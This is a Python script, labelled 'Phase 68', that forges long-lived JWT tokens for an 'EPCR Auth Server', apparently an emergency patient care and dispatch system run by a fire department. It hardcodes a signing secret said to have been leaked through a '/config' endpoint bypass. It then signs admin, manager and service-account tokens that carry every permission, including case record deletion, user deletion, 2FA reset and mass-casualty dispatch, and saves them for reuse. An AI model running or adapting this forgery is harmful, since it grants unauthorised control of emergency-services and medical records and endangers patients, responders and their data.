#!/usr/bin/env python3
"""Phase 68: Generate permanent forged JWT tokens for EPCR Auth Server."""
import json
import hashlib

# EPCR Auth Server JWT Secret (exposed via /config endpoint bypass)
JWT_PASSWORD = "ru/3xu4dkru4888"
JWT_ALG = "HS256"

# Generate a permanent JWT (10 years expiry)
import time
now = int(time.time())
exp = now + (10 * 365 * 24 * 3600)  # 10 years

# Full admin JWT with ALL permissions
admin_permissions = [
    "EPCR_SERVICE", "EPCR_PAGE_BULLETIN", "EPCR_PAGE_RESOURCEMANAGEMENT",
    "EPCR_PAGE_MONITOR", "EPCR_PAGE_CASELIST", "EPCR_PAGE_CASEDETAIL",
    "EPCR_PAGE_CASEDETAILPRINT", "EPCR_PAGE_MCILIST", "EPCR_PAGE_MCIDETAIL",
    "EPCR_PAGE_BRANCH", "EPCR_PAGE_BRANCHGROUP", "EPCR_PAGE_HOSPITAL",
    "EPCR_PAGE_DEVICE", "EPCR_PAGE_AMBULANCE", "EPCR_PAGE_EMT",
    "EPCR_PAGE_EMTLEVEL", "EPCR_PAGE_EMTTRAINING", "EPCR_PAGE_EMTTRAININGTYPE",
    "EPCR_PAGE_STAT", "EPCR_PAGE_ISSUETRACKING", "PAGE_PERMISSION",
    "EPCR_PAGE_CASESIMULATOR", "EPCR_CASERECORD_READ", "EPCR_CASERECORD_UPDATE",
    "EPCR_CASERECORD_CREATE", "EPCR_CASERECORD_DELETE", "HOSPITAL_PAGE_HOSPITAL",
    "HOSPITAL_PAGE_HOSPITALCAPABILITY", "HOSPITAL_PAGE_BACKTRACKING",
    "HOSPITAL_PAGE_HOSPITALCAPABILITYLIST", "DOCTOR_PAGE_DOCTOR",
    "DOCTOR_PAGE_SCHEDULE", "DOCTOR_INSTRUCT_ALL", "MONITOR_ALL",
    "EPCR_OFFICIALCASE", "EPCR_CASE_SCORE", "AUTH_ROLE", "AUTH_USER",
    "AUTH_PERM", "AUTH_USER_ALL", "AUTH_RESET_PASSWORD", "AUTH_RESET_LOGIN",
    "AUTH_DEL_USER", "AUTH_2FA", "MCI_UPDATE_CASE", "MCI_TRIAGE",
    "MCI_TREATMENT", "MCI_DISPATCH", "MCI_EMT", "MCI_ASSIGN_ROLE",
    "MCI_VIEW_PCR", "MCI_DELEGATE", "MCI_ANNOUNCE", "MCI_AMBULANCE_RECORD",
    "MCI_MAP_MARKER", "MCI_GUEST", "EPCR_PAGE_OHCACASELIST"
]

# Full RBAC permissions from extracted data
payloads = {
    "admin_full": {
        "sub": 1,
        "iat": now,
        "exp": now + (10 * 365 * 24 * 3600),
        "user": {
            "id": 1,
            "name": "消防局 Admin",
            "account": "admin",
            "role": "ADMIN",
            "roleId": 1
        },
        "permissions": admin_permissions
    },
    "manager_full": {
        "sub": 2,
        "iat": now,
        "exp": now + (10 * 365 * 24 * 3600),
        "user": {
            "id": 2,
            "name": "消防局管理者",
            "account": "manager",
            "role": "MANAGER",
            "roleId": 2
        },
        "permissions": admin_permissions
    },
    "service_account": {
        "sub": 6,
        "iat": now,
        "exp": now + (10 * 365 * 24 * 3600),
        "user": {
            "id": 6,
            "name": "系統帳號",
            "account": "__SERVICE__",
            "role": "SERVICE",
            "roleId": 6
        },
        "permissions": admin_permissions
    }
}

def base64url_encode(data):
    """Base64Url encode without padding."""
    import base64
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def generate_jwt(payload, secret):
    """Manually generate JWT to avoid dependency issues."""
    import hmac
    import hashlib
    
    header = {'alg': 'HS256', 'typ': 'JWT'}
    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(
        secret.encode('utf-8'),
        message.encode('utf-8'),
        hashlib.sha256
    ).digest()
    sig_b64 = base64url_encode(signature)
    
    return f"{header_b64}.{payload_b64}.{sig_b64}"

# Generate JWTs
print("=" * 60)
print("EPCR Auth Server — Permanent Forged JWT Tokens")
print("=" * 60)
print(f"JWT_SECRET: {JWT_PASSWORD}")
print(f"Algorithm: HS256")
print(f"Lifetime: 10 years")
print()

tokens = {}
for name, payload in payloads.items():
    token = generate_jwt(payload, JWT_PASSWORD)
    tokens[name] = token
    print(f"### {name.upper()}")
    print(f"Account: {payload['user']['account']}")
    print(f"Role: {payload['user']['role']}")
    print(f"Token: {token}")
    print(f"Length: {len(token)} chars")
    print()

# Save tokens
with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/forged_jwt_tokens.json', 'w') as f:
    json.dump(tokens, f, indent=2, ensure_ascii=False)

# Save individual token files for easy use
for name, token in tokens.items():
    with open(f'/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/jwt_{name}.txt', 'w') as f:
        f.write(token)

print("=" * 60)
print("Tokens saved:")
print("  JSON: tpe119_evidence/forged_jwt_tokens.json")
print("  TXT:  tpe119_evidence/jwt_admin_full.txt")
print("        tpe119_evidence/jwt_manager_full.txt")
print("        tpe119_evidence/jwt_service_account.txt")
print("=" * 60)
